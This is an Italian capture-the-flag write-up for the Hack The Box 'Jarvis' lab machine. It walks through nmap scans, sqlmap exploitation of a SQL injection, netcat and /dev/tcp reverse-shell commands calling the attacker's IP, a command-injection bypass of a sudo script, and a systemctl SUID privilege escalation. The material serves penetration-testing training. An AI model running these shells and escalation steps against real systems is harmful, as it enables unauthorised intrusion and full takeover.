# Jarvis

## Reconnaissance

Per prima cosa eseguo una scansione iniziale con nmap.

```text
sudo nmap -sC -sV -O -oA /usr/share/nmap/initial 10.10.10.143
```

* **-sC**: scipt nmap di default
* **-sV**: per rilevare la versione dei servizi
* **-O**: per rilevare il SO
* **-oA**: per stampare tutti i formati e salvarli nel file _nmap/initial_

Il risultato della scansione è il seguente:

```text
Nmap scan report for 10.10.10.143 (10.10.10.143)
Host is up (0.040s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Stark Hotel
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=11/10%OT=22%CT=1%CU=38903%PV=Y%DS=2%DC=I%G=Y%TM=654DF7
OS:CD%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=8)OP
OS:S(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST
OS:11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)EC
OS:N(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Provo ad eseguire una scansione completa:

```text
sudo nmap -sC -sV -O -p- -oA /usr/share/nmap/full 10.10.10.143
```

Il risultato della scansione è il seguente:

```text
Nmap scan report for 10.10.10.143 (10.10.10.143)
Host is up (0.041s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Stark Hotel
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=11/10%OT=22%CT=1%CU=41634%PV=Y%DS=2%DC=I%G=Y%TM=654DF8
OS:0B%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=8)OP
OS:S(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST
OS:11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)EC
OS:N(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration

Successivamente, visito la pagina http://10.10.10.143/:

<p align="center">
  <img src="/Immagini/Linux-Box/Jarvis/jarvis-1.png"/>
</p>

Aggiungo _supersecurehotel.htb_ al file _/etc/hosts_.

Provo ad utilizzare il comando _dirsearch_:

```text
dirsearch -u http://10.10.10.143/
```

```text
[04:53:09] 301 -  309B  - /js  ->  http://10.10.10.143/js/
[04:53:11] 403 -  277B  - /.ht_wsr.txt
[04:53:11] 403 -  277B  - /.htaccess.bak1
[04:53:11] 403 -  277B  - /.htaccess.orig
[04:53:11] 403 -  277B  - /.htaccess.sample
[04:53:11] 403 -  277B  - /.htaccess.save
[04:53:11] 403 -  277B  - /.htaccessBAK
[04:53:11] 403 -  277B  - /.htaccessOLD
[04:53:11] 403 -  277B  - /.htaccessOLD2
[04:53:11] 403 -  277B  - /.html
[04:53:11] 403 -  277B  - /.htm
[04:53:11] 403 -  277B  - /.httr-oauth
[04:53:11] 403 -  277B  - /.htpasswd_test
[04:53:11] 403 -  277B  - /.htpasswds
[04:53:11] 403 -  277B  - /.htaccess_extra
[04:53:11] 403 -  277B  - /.htaccess_orig
[04:53:11] 403 -  277B  - /.htaccess_sc
[04:53:12] 403 -  277B  - /.php3
[04:53:12] 403 -  277B  - /.php
[04:53:37] 301 -  310B  - /css  ->  http://10.10.10.143/css/
[04:53:42] 301 -  312B  - /fonts  ->  http://10.10.10.143/fonts/
[04:53:42] 200 -    2KB - /footer.php
[04:53:45] 301 -  313B  - /images  ->  http://10.10.10.143/images/
[04:53:45] 200 -    7KB - /images/
[04:53:45] 200 -   23KB - /index.php
[04:53:46] 200 -   23KB - /index.php/login/
[04:53:48] 200 -    3KB - /js/
[04:53:57] 200 -   19KB - /phpmyadmin/ChangeLog
[04:53:57] 200 -    1KB - /phpmyadmin/README
[04:53:58] 200 -   15KB - /phpmyadmin/doc/html/index.html
[04:53:58] 301 -  317B  - /phpmyadmin  ->  http://10.10.10.143/phpmyadmin/
[04:54:00] 200 -   15KB - /phpmyadmin/index.php
[04:54:00] 200 -   15KB - /phpmyadmin/
[04:54:05] 403 -  277B  - /server-status
[04:54:05] 403 -  277B  - /server-status/
```

Dopo aver navigato tra i vari risultati, una delle informazioni più interessanti è quella relativa alla pagina http://10.10.10.143/phpmyadmin/. Scopro infatti che la versione di phpmyadmin utilizzata è la  4.8.1. Tramite _searchesploit_ scopro che è vulnerabile, ma occorre recuperare prima le credenziali.

<p align="center">
  <img src="/Immagini/Linux-Box/Jarvis/jarvis-3.png"/>
</p>

<p align="center">
  <img src="/Immagini/Linux-Box/Jarvis/jarvis-4.png"/>
</p>

Provo a visitare la pagina http://10.10.10.143:64999:

<p align="center">
  <img src="/Immagini/Linux-Box/Jarvis/jarvis-2.png"/>
</p>

**Sono stato bannato!** #FREESDRUMOX


## Exploitation

Dalla pagina README scopro anche che viene utilizzato MySQL come database, quindi provo a verificare la vulnerabilità all'SQL Injection. Tramite burp intercetto la richiesta relativa alla selezione di una specifica camera sul sito e, tramite il Repeater, provo a inviarla aggiungendo una semplice SQL Injection time-based:

<p align="center">
  <img src="/Immagini/Linux-Box/Jarvis/jarvis-5.png"/>
</p>

**Funziona!**

Quindi copio la richiesta all'interno del file _richiesta.txt_ e procedo utilizzando _sqlmap_:

```text
sqlmap -v 4 --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" -r richiesta.txt
```

Il risultato conferma la vulnerabilità all'SQL Injection. Quindi provo a ricavare le password degli utenti tramite il seguente comando:

```text
sqlmap -v 4 --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" --passwords -r richiesta.txt
```

Scopro così la password per il DBMS:

<p align="center">
  <img src="/Immagini/Linux-Box/Jarvis/jarvis-7.png"/>
</p>

<p align="center">
  <img src="/Immagini/Linux-Box/Jarvis/jarvis-6.png"/>
</p>

Provo ad utilizzare le credenziali sulla pagina :

<p align="center">
  <img src="/Immagini/Linux-Box/Jarvis/jarvis-8.png"/>
</p>

**E sono dentro!**

<p align="center">
  <img src="/Immagini/Linux-Box/Jarvis/jarvis-9.png"/>
</p>

Prima di ispezionare questa pagina, un'altra feature interessante di _sqlmap_ consiste nel tentare di ottenere una shell sull'host dove gira il webserver:

```text
sqlmap -v 4 --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" --os-shell -r richiesta.txt
```

**Funziona!**

<p align="center">
  <img src="/Immagini/Linux-Box/Jarvis/jarvis-10.png"/>
</p>

<p align="center">
  <img src="/Immagini/Linux-Box/Jarvis/jarvis-11.png"/>
</p>

Per ricavare una reverse shell avvio un listener sulla porta 1234 e idutilizzo il seguente comando:

```text
nc -e /bin/sh 10.10.14.7 1234
```

Successivamente, utilizzo il seguente comando per ottenre una shell migliore:

```text
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Privilege Escalation

Controllo i privilegi sudo dell'utente _www.data_:

```text
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
```

Ispeziono quindi il file _simpler.py_ (sul quale ho soltato i permessi in lettura):

```text
#!/usr/bin/env python3
from datetime import datetime
import sys
import os
from os import listdir
import re

def show_help():
    message='''
********************************************************
* Simpler   -   A simple simplifier ;)                 *
* Version 1.0                                          *
********************************************************
Usage:  python3 simpler.py [options]

Options:
    -h/--help   : This help
    -s          : Statistics
    -l          : List the attackers IP
    -p          : ping an attacker IP
    '''
    print(message)

def show_header():
    print('''***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/
                                @ironhackers.es

***********************************************
''')

def show_statistics():
    path = '/home/pepper/Web/Logs/'
    print('Statistics\n-----------')
    listed_files = listdir(path)
    count = len(listed_files)
    print('Number of Attackers: ' + str(count))
    level_1 = 0
    dat = datetime(1, 1, 1)
    ip_list = []
    reks = []
    ip = ''
    req = ''
    rek = ''
    for i in listed_files:
        f = open(path + i, 'r')
        lines = f.readlines()
        level2, rek = get_max_level(lines)
        fecha, requ = date_to_num(lines)
        ip = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
        if fecha > dat:
            dat = fecha
            req = requ
            ip2 = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
        if int(level2) > int(level_1):
            level_1 = level2
            ip_list = [ip]
            reks=[rek]
        elif int(level2) == int(level_1):
            ip_list.append(ip)
            reks.append(rek)
        f.close()

    print('Most Risky:')
    if len(ip_list) > 1:
        print('More than 1 ip found')
    cont = 0
    for i in ip_list:
        print('    ' + i + ' - Attack Level : ' + level_1 + ' Request: ' + reks[cont])
        cont = cont + 1

    print('Most Recent: ' + ip2 + ' --> ' + str(dat) + ' ' + req)

def list_ip():
    print('Attackers\n-----------')
    path = '/home/pepper/Web/Logs/'
    listed_files = listdir(path)
    for i in listed_files:
        f = open(path + i,'r')
        lines = f.readlines()
        level,req = get_max_level(lines)
        print(i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3] + ' - Attack Level : ' + level)
        f.close()

def date_to_num(lines):
    dat = datetime(1,1,1)
    ip = ''
    req=''
    for i in lines:
        if 'Level' in i:
            fecha=(i.split(' ')[6] + ' ' + i.split(' ')[7]).split('\n')[0]
            regex = '(\d+)-(.*)-(\d+)(.*)'
            logEx=re.match(regex, fecha).groups()
            mes = to_dict(logEx[1])
            fecha = logEx[0] + '-' + mes + '-' + logEx[2] + ' ' + logEx[3]
            fecha = datetime.strptime(fecha, '%Y-%m-%d %H:%M:%S')
            if fecha > dat:
                dat = fecha
                req = i.split(' ')[8] + ' ' + i.split(' ')[9] + ' ' + i.split(' ')[10]
    return dat, req

def to_dict(name):
    month_dict = {'Jan':'01','Feb':'02','Mar':'03','Apr':'04', 'May':'05', 'Jun':'06','Jul':'07','Aug':'08','Sep':'09','Oct':'10','Nov':'11','Dec':'12'}
    return month_dict[name]

def get_max_level(lines):
    level=0
    for j in lines:
        if 'Level' in j:
            if int(j.split(' ')[4]) > int(level):
                level = j.split(' ')[4]
                req=j.split(' ')[8] + ' ' + j.split(' ')[9] + ' ' + j.split(' ')[10]
    return level, req

def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)

if __name__ == '__main__':
    show_header()
    if len(sys.argv) != 2:
        show_help()
        exit()
    if sys.argv[1] == '-h' or sys.argv[1] == '--help':
        show_help()
        exit()
    elif sys.argv[1] == '-s':
        show_statistics()
        exit()
    elif sys.argv[1] == '-l':
        list_ip()
        exit()
    elif sys.argv[1] == '-p':
        exec_ping()
        exit()
    else:
        show_help()
        exit()
```

Dopo aver studiato il codice capisco che posso sfruttarlo per elevare i miei privilegi. In particolare la funzione _exec_ping()_ prende l'input dell'utente e controlla se la presenza di alcuni caratteri al suo interno. Se trova uno di questi caratteri **['&', ';', '-', '`', '||', '|']**, stampa il messaggio "Got you" e termina il programma, altrimenti esegue il comando _ping_ sull'input dato.

Quindi eseguo lo script python:

```text
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
```

E inserisco come input il seguente testo:

<p align="center">
  <img src="/Immagini/Linux-Box/Jarvis/jarvis-13.png"/>
</p>

Putroppo sembra che ci siano dei problemi sulla shell, in quanto non riesco a vedere l'output dei comandi che utilizzo. Quindi avvio un listener sulla porta 1235 e utilizzo il seguente comando per ricavare una nuova reverse shell:

```text
nc -e /bin/sh 10.10.14.7 1235
```

<p align="center">
  <img src="/Immagini/Linux-Box/Jarvis/jarvis-12.png"/>
</p>

**Ottengo il primo flag!**

Ottengo una shell migliore con questo comando:

```text
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Ora devo trovare un modo per diventare root.

Per prima cosa, tramite un server http, trasferisco il file _LinEnum.sh_ sulla macchina _jarvis_ e lo eseguo.

Nell'output prodotto dello script, una delle parti più interessanti è quella relativa al SUID:

```text
[-] SUID files:
-rwsr-xr-x 1 root root 30800 Aug 21  2018 /bin/fusermount
-rwsr-xr-x 1 root root 44304 Mar  7  2018 /bin/mount
-rwsr-xr-x 1 root root 61240 Nov 10  2016 /bin/ping
-rwsr-x--- 1 root pepper 174520 Jun 29  2022 /bin/systemctl
-rwsr-xr-x 1 root root 31720 Mar  7  2018 /bin/umount
-rwsr-xr-x 1 root root 40536 Mar 17  2021 /bin/su
-rwsr-xr-x 1 root root 40312 Mar 17  2021 /usr/bin/newgrp
-rwsr-xr-x 1 root root 59680 Mar 17  2021 /usr/bin/passwd
-rwsr-xr-x 1 root root 75792 Mar 17  2021 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 40504 Mar 17  2021 /usr/bin/chsh
-rwsr-xr-x 1 root root 140944 Jan 23  2021 /usr/bin/sudo
-rwsr-xr-x 1 root root 50040 Mar 17  2021 /usr/bin/chfn
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 440728 Mar  1  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 42992 Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper


[+] Possibly interesting SUID files:
-rwsr-x--- 1 root pepper 174520 Jun 29  2022 /bin/systemctl
```

Il file _/bin/systemctl_ può essere sfruttato per scalare i privilegi. Facendo delle ricerche trovo una guida molto interessante [qui](https://gtfobins.github.io/gtfobins/systemctl/).

Quindi, sulla mia macchina, creo il file _root.service_:

```text                                                             
[Unit]
Description=get root privilege

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.7/9696 0>&1'

[Install]
WantedBy=multi-user.target
```

Lo passo alla macchina _jarvis_ tramite server http e lancio il seguente comando:

```text
/bin/systemctl enable /home/pepper/root.service
```

Poi avvio un listener sulla porta 9696 e lancio questo comando sulla macchina _jarvis_:

```text
/bin/systemctl start root
```

<p align="center">
  <img src="/Immagini/Linux-Box/Jarvis/jarvis-14.png"/>
</p>

**Sono root!**

## Credits
  - [Samuel Whang](https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49)
  - [Rana Khalil](https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/jarvis-writeup-w-o-metasploit#b8df)
